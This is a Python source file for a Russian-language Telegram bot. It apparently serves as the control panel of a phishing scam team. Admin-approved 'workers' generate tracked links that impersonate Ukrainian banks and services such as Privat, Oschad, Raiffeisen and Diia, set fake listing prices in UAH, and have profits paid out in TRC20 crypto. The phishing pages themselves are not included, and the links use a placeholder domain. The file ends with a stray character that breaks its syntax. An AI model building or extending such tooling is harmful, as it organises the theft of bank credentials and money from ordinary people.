import asyncio
import os
import sqlite3
import uuid

from aiogram import Bot, Dispatcher, F
from aiogram.types import (
    Message, InlineKeyboardMarkup, InlineKeyboardButton,
    CallbackQuery
)
from aiogram.filters import CommandStart
from aiogram.fsm.context import FSMContext
from aiogram.fsm.state import StatesGroup, State


BOT_TOKEN = os.getenv("BOT_TOKEN")
ADMIN_ID = 8468065089

PHOTO_FILE_ID = "AgACAgUAAxkBAAEcSFFpvKqbYr0IfiMOKypItDtDip7SXgACJw5rG8Vq6VX8OCc0sIop2AEAAwIAA3gAAzoE"

bot = Bot(token=BOT_TOKEN)
dp = Dispatcher()


# -------------------- БД --------------------

conn = sqlite3.connect("bot.db")
cursor = conn.cursor()

cursor.execute("""
CREATE TABLE IF NOT EXISTS users (
    user_id INTEGER PRIMARY KEY,
    approved INTEGER DEFAULT 0
)
""")

cursor.execute("""
CREATE TABLE IF NOT EXISTS links (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    user_id INTEGER,
    project TEXT,
    price INTEGER,
    link TEXT
)
""")

cursor.execute("""
CREATE TABLE IF NOT EXISTS settings (
    user_id INTEGER PRIMARY KEY,
    tag TEXT DEFAULT '#',
    domain TEXT DEFAULT 'Общий',
    payment TEXT DEFAULT 'TRC20',
    traffic INTEGER DEFAULT 0
)
""")

conn.commit()


def approve_user(user_id: int):
    cursor.execute("INSERT OR IGNORE INTO users (user_id, approved) VALUES (?, 0)", (user_id,))
    cursor.execute("UPDATE users SET approved=1 WHERE user_id=?", (user_id,))
    conn.commit()


def is_approved(user_id: int) -> bool:
    cursor.execute("SELECT approved FROM users WHERE user_id=?", (user_id,))
    result = cursor.fetchone()
    return result and result[0] == 1


def get_settings(user_id):
    cursor.execute("SELECT * FROM settings WHERE user_id=?", (user_id,))
    data = cursor.fetchone()

    if not data:
        cursor.execute("INSERT INTO settings (user_id) VALUES (?)", (user_id,))
        conn.commit()
        return get_settings(user_id)

    return {
        "tag": data[1],
        "domain": data[2],
        "payment": data[3],
        "traffic": data[4]
    }


# -------------------- FSM --------------------

class Form(StatesGroup):
    about = State()
    source = State()
    price = State()
    tag = State()


# -------------------- КНОПКИ --------------------

def main_menu_kb():
    return InlineKeyboardMarkup(
        inline_keyboard=[
            [InlineKeyboardButton(text="🏝 Создать ссылку", callback_data="create_link")],
            [InlineKeyboardButton(text="🤍 Мои объявления", callback_data="my_posts")],
            [InlineKeyboardButton(text="🍬 Настройки", callback_data="settings")]
        ]
    )


def projects_kb():
    return InlineKeyboardMarkup(
        inline_keyboard=[
            [
                InlineKeyboardButton(text="🇺🇦 Приват", callback_data="proj_privat"),
                InlineKeyboardButton(text="🇺🇦 Ощад", callback_data="proj_oshad")
            ],
            [
                InlineKeyboardButton(text="🇺🇦 Райффайзен", callback_data="proj_raif"),
                InlineKeyboardButton(text="🇺🇦 Дия", callback_data="proj_diya")
            ],
            [
                InlineKeyboardButton(text="🇺🇦 Вайбер", callback_data="proj_viber"),
                InlineKeyboardButton(text="🇺🇦 Пумб", callback_data="proj_pumb")
            ],
            [
                InlineKeyboardButton(text="🇺🇦 УКР СИБ", callback_data="proj_ukrsib"),
                InlineKeyboardButton(text="🇺🇦 Дия 2", callback_data="proj_diya2")
            ],
            [
                InlineKeyboardButton(text="⬅️ Назад", callback_data="back_menu")
            ]
        ]
    )


def settings_kb(traffic):
    return InlineKeyboardMarkup(
        inline_keyboard=[
            [InlineKeyboardButton(text="✍️ изменить тэг", callback_data="set_tag")],
            [InlineKeyboardButton(
                text="✅ вкл переходы" if not traffic else "❌ выкл переходы",
                callback_data="toggle_traffic"
            )],
            [InlineKeyboardButton(text="💌 сообщения кодеру", callback_data="coder")],
            [InlineKeyboardButton(text="🔗 add личный домен", callback_data="add_domain")],
            [InlineKeyboardButton(text="⬅️ назад", callback_data="back_menu")]
        ]
    )


def generate_link(user_id, project):
    unique = str(uuid.uuid4())[:8]
    return f"https://example.com/{project}?user={user_id}&id={unique}"


# -------------------- МЕНЮ --------------------

async def send_main_menu(user_id, username):
    text = (
        f"🌿 Приветствуем тебя, {username}!\n\n"
        f"💎 Твой статус: Воркер\n"
        f"👨‍💻 Кол-во юзеров: 36\n"
        f"✨ Профитов: 0\n\n"
        f"❄️ Статус проекта: ✅ work\n\n"
        f"Куда дальше? 👇"
    )

    await bot.send_photo(
        chat_id=user_id,
        photo=PHOTO_FILE_ID,
        caption=text,
        reply_markup=main_menu_kb()
    )


# -------------------- СОЗДАНИЕ ССЫЛКИ --------------------

@dp.callback_query(F.data == "create_link")
async def create_link(callback: CallbackQuery):
    await callback.answer()

    await callback.message.edit_caption(
        caption="🤖 Все проекты:",
        reply_markup=projects_kb()
    )


@dp.callback_query(F.data.startswith("proj_"))
async def select_project(callback: CallbackQuery, state: FSMContext):
    await callback.answer()

    project = callback.data.split("_")[1]
    await state.update_data(project=project)

    await callback.message.edit_caption(
        caption=f"💰 Введи цену объявления для {project}:",
        reply_markup=InlineKeyboardMarkup(
            inline_keyboard=[
                [InlineKeyboardButton(text="⬅️ Назад", callback_data="create_link")]
            ]
        )
    )

    await state.set_state(Form.price)


@dp.message(Form.price)
async def get_price(message: Message, state: FSMContext):
    if not message.text.isdigit():
        await message.answer("❌ Введи число")
        return

    price = int(message.text)
    data = await state.get_data()

    project = data["project"]
    user_id = message.from_user.id

    link = generate_link(user_id, project)

    cursor.execute(
        "INSERT INTO links (user_id, project, price, link) VALUES (?, ?, ?, ?)",
        (user_id, project, price, link)
    )
    conn.commit()

    await message.answer(
        f"🔗 Ссылка создана!\n\n"
        f"🏦 {project}\n"
        f"💰 {price} UAH\n\n"
        f"{link}"
    )

    await state.clear()


# -------------------- МОИ ОБЪЯВЛЕНИЯ --------------------

@dp.callback_query(F.data == "my_posts")
async def my_posts(callback: CallbackQuery):
    await callback.answer()

    user_id = callback.from_user.id

    cursor.execute("SELECT project, price FROM links WHERE user_id=?", (user_id,))
    rows = cursor.fetchall()

    if not rows:
        text = "📭 У тебя нет объявлений"
    else:
        text = "🐰 Ваши ссылки:\n\n"
        for project, price in rows:
            text += f"• Украина / {project} / {price} UAH\n"

    kb = InlineKeyboardMarkup(
        inline_keyboard=[
            [InlineKeyboardButton(text="🗑 Удалить все ссылки", callback_data="delete_links")],
            [InlineKeyboardButton(text="⬅️ Назад", callback_data="back_menu")]
        ]
    )

    await callback.message.edit_caption(
        caption=text,
        reply_markup=kb
    )


@dp.callback_query(F.data == "delete_links")
async def delete_links(callback: CallbackQuery):
    await callback.answer()

    user_id = callback.from_user.id
    cursor.execute("DELETE FROM links WHERE user_id=?", (user_id,))
    conn.commit()

    await callback.message.edit_caption(
        caption="🗑 Все ссылки удалены",
        reply_markup=InlineKeyboardMarkup(
            inline_keyboard=[
                [InlineKeyboardButton(text="⬅️ Назад", callback_data="back_menu")]
            ]
        )
    )


# -------------------- НАСТРОЙКИ --------------------

@dp.callback_query(F.data == "settings")
async def settings(callback: CallbackQuery):
    await callback.answer()

    user_id = callback.from_user.id
    s = get_settings(user_id)

    traffic_status = "❌ выкл" if s["traffic"] == 0 else "✅ вкл"

    text = (
        "🍬 Настройки / Налаштування\n\n"
        f"1️⃣ Твой тэг: {s['tag']}\n"
        f"2️⃣ Домен: {s['domain']}\n"
        f"3️⃣ Способ выплаты: {s['payment']}\n"
        f"4️⃣ Переходы: {traffic_status}"
    )

    await callback.message.edit_caption(
        caption=text,
        reply_markup=settings_kb(s["traffic"])
    )


@dp.callback_query(F.data == "toggle_traffic")
async def toggle_traffic(callback: CallbackQuery):
    await callback.answer()

    user_id = callback.from_user.id
    s = get_settings(user_id)

    new_value = 0 if s["traffic"] else 1

    cursor.execute(
        "UPDATE settings SET traffic=? WHERE user_id=?",
        (new_value, user_id)
    )
    conn.commit()

    await settings(callback)


@dp.callback_query(F.data == "set_tag")
async def set_tag(callback: CallbackQuery, state: FSMContext):
    await callback.answer()

    await callback.message.edit_caption(
        caption="✍️ Введи новый тег:"
    )

    await state.set_state(Form.tag)


@dp.message(Form.tag)
async def save_tag(message: Message, state: FSMContext):
    user_id = message.from_user.id

    cursor.execute(
        "UPDATE settings SET tag=? WHERE user_id=?",
        (message.text, user_id)
    )
    conn.commit()

    await message.answer("✅ Тег обновлен")
    await state.clear()

    await send_main_menu(user_id, message.from_user.full_name)


# -------------------- НАЗАД --------------------

@dp.callback_query(F.data == "back_menu")
async def back_menu(callback: CallbackQuery):
    await callback.answer()

    await send_main_menu(
        callback.from_user.id,
        callback.from_user.full_name
    )


# -------------------- СТАРТ --------------------

@dp.message(CommandStart())
async def start(message: Message, state: FSMContext):
    user_id = message.from_user.id

    if is_approved(user_id):
        await send_main_menu(user_id, message.from_user.full_name)
        return

    await message.answer("Расскажи о себе:")
    await state.set_state(Form.about)


@dp.message(Form.about)
async def about(message: Message, state: FSMContext):
    await state.update_data(about=message.text)
    await message.answer("Откуда узнал?")
    await state.set_state(Form.source)


@dp.message(Form.source)
async def source(message: Message, state: FSMContext):
    data = await state.get_data()
    user = message.from_user

    kb = InlineKeyboardMarkup(
        inline_keyboard=[
            [
                InlineKeyboardButton(text="✅ Принять", callback_data=f"approve_{user.id}"),
                InlineKeyboardButton(text="❌ Отклонить", callback_data=f"reject_{user.id}")
            ]
        ]
    )

    await bot.send_message(ADMIN_ID, f"{data['about']}\n{message.text}", reply_markup=kb)
    await message.answer("⏳ Ожидай")

    await state.clear()


# -------------------- АДМИН --------------------

@dp.callback_query(F.data.startswith("approve_"))
async def approve(callback: CallbackQuery):
    await callback.answer()

    user_id = int(callback.data.split("_")[1])
    approve_user(user_id)

    await send_main_menu(user_id, (await bot.get_chat(user_id)).full_name)
    await callback.message.edit_text("Принят ✅")


@dp.callback_query(F.data.startswith("reject_"))
async def reject(callback: CallbackQuery):
    await callback.answer()

    user_id = int(callback.data.split("_")[1])
    await bot.send_message(user_id, "❌ Отклонено")
    await callback.message.edit_text("Отклонено ❌")


# -------------------- RUN --------------------

async def main():
    print("Bot started!")
    await dp.start_polling(bot)


if __name__ == "__main__":
    asyncio.run(main())ы
